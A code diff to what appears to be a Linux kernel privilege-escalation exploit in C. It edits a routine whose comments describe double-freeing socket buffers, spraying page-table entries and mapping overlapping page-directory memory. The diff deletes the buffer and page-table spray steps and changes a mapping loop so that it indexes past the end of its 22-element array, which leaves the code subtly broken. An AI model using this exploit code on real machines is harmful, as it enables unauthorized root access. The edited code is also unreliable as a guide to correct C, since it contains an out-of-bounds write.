@@ -325,19 +325,6 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	//printf("some chill after 1st free");
 	//sleep(3);
 	
-	// push N skbs to skb freelist
-	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
-	{
-		PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
-		recv_ipv4_udp(1);
-	}
-	//sleep(3);
-	// spray-allocate the PTEs from PCP allocator order-0 list
-	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
-	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
-		*(unsigned long long*)PTI_TO_VIRT(2, 0, i, 0, 0) = i;
-
-	PRINTF_VERBOSE("[*] double-freeing skb...\n");
 
 	//printf("[*] SLEEP 1s before double free...\n");
 	//sleep(1);
@@ -355,9 +342,9 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	// allocate overlapping PMD page (overlaps with PTE)
 	//printf("[*] SLEEP 1s after double free...\n");
 	//sleep(1);
-	void *_pmd_area1[20];
+	void *_pmd_area1[22];
 	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
-	for (int i=0; i < 20; i++){
+	for (int i=2; i < 24; i++){
 		_pmd_area1[i] = mmap((void*)PTI_TO_VIRT(1, i, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
 		*(unsigned long long*)_pmd_area1[i] = 0xCAFEBABA;
 	}
